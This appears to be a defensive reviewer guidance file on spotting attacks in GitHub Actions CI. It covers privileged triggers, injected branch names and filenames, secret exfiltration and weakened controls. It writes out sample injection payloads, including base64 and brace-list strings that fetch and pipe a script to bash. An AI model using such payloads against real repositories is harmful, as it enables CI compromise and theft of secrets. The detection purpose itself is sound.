---
name: ci-and-workflows
description: "GitHub Actions and CI: privileged triggers that run untrusted input, author-controlled strings a workflow interpolates (filenames, branches, titles, slash commands), secret-reaching workflows, and weakened controls."
---

# CI definitions and what they interpolate

CI runs with the repository's secrets and write token. An attack here makes CI run attacker input, or quietly weakens what CI enforces. Public archetypes: the 2026 hackerbot-claw campaign (shell in branch names and filenames reaching `pull_request_target` workflows), Ultralytics 2024 (a branch name injected into a `pull_request_target` workflow, then a poisoned cache reached the publish job), GhostAction 2025 (a pushed "security" workflow POSTing named secrets to an outside host), tj-actions and reviewdog 2025 (tags repointed to malicious commits), Clinejection 2026 (an issue title steering an AI triage workflow with shell access, then Actions-cache poisoning to reach publish tokens).

## Footprints

**Privileged context running untrusted input**
- Triggers that run with secrets on outsider input: `pull_request_target`, `workflow_run`, `issue_comment`, `issues`, `discussion`. Alone they are ordinary (label bots, welcome bots).
- The dangerous pairing: such a trigger AND the PR head checked out or executed (`ref: ${{ ...head.sha }}`, `gh pr checkout`, `git fetch origin pull/...`, `allow-unsafe-pr-checkout: true`), or an expression of the event (`${{ github.event.pull_request.title }}`, `.head.ref`, `.body`, `.comment.body`, filenames) written directly into `run:` or into an agent's prompt.
- `runs-on: self-hosted` reachable from a fork or an untrusted event.

**Author strings a workflow interpolates** (they are code once a `run:` expands them)
- Filenames, branch names, titles carrying `$(`, backticks, `${IFS}`, brace lists `{curl,-sSfL,host}`, or base64 piped to a shell: `$(echo${IFS}<b64>|base64${IFS}-d|bash)`, `dev$({curl,-sSfL,h/x}${IFS}|${IFS}bash)`.
- A slash command (`/format`, `/version minor`, `@bot ...`) posted by the change's own author minutes after opening it, or by an outsider: the trigger of an `issue_comment` workflow. Judge it with what that workflow would then run.
- A comment is its WRITER's evidence: a payload in a drive-by's comment says something about the drive-by, not about the author of the PR it was posted on.

**Secret reach and persistence**
- A new workflow, often with a reassuring name, that does little but name `secrets.*` or `toJSON(secrets)` and send them out (`curl -d`, `--data-binary`), or prints them to the log.
- Writes to `$GITHUB_ENV` / `$GITHUB_PATH` from untrusted data (later steps run with it).
- `permissions: write-all` or a widened `contents: write`/`id-token: write` without a reason in the change.

**Weakened controls**
- A `uses:` repointed from a SHA to a mutable tag, to a fork, or to a lookalike owner.
- Deleting or neutering a guard workflow (required checks, change-review gates), `continue-on-error: true` on a security step, `[skip ci]` on a commit that carries a payload.
- Cache keys an untrusted job can write and a privileged job restores.

## Verify (read, never run)

1. List every workflow's triggers. For each privileged trigger, trace whether any PR-controlled value (ref, checkout, expression, artifact, cache) reaches `run:`, a checkout, or an agent prompt. An expression in `env:` that `run:` reads as `"$VAR"` is safe; the same expression inlined in `run:` is injectable.
2. Expand author strings the way a shell would: replace `${IFS}`/`$IFS` with a space, expand `{a,b,c}` into words, base64-decode, then `scan_indicators(decoded, decoded_from=<span>)`.
3. Diff `permissions:` and `uses:` before and after. Note any guard that disappears.
4. For a secret-naming workflow: where does each `secrets.*` go? A vendor CLI the repo already uses is a deploy step; an unrelated host is exfiltration.

## Look-alikes (benign, seen in practice)

- A label bot or welcome bot on `pull_request_target` that never checks out the head.
- Hardening: SHA-pinning `uses:`, narrowing `permissions:`, moving runners between hosted pools.
- `id-token: write` and `contents: write` in a release or trusted-publishing workflow that already publishes.
- A maintainer branch with an odd character (`fix/handle_${HOME}_expansion`): weigh who pushed it.
- Real `/format` bot comments from maintainers.

## Rules that fire here

`pwn-request`, `privileged-fork-trigger`, `ci-shell-injection`, `branch-name-injection`, `branch-name-metachar`, `slash-command-trigger`, `workflow-permission-escalation`, `workflow-tamper`, `ci-bypass`, `obfuscated-payload`, `command-substitution`, `data-exfiltration`, `exfil-infrastructure`. No rule reads: a repointed `uses:`, `$GITHUB_ENV` writes, a deleted guard workflow, cache keys, secret-naming workflows that use an unfamiliar host. Those are yours to read.

## Why least privilege does not clear it

Code running in CI on attacker input is the finding, whatever token scope it gets: it can poison a cache, an artifact or a release, and pivot from there. Classify on the injection.
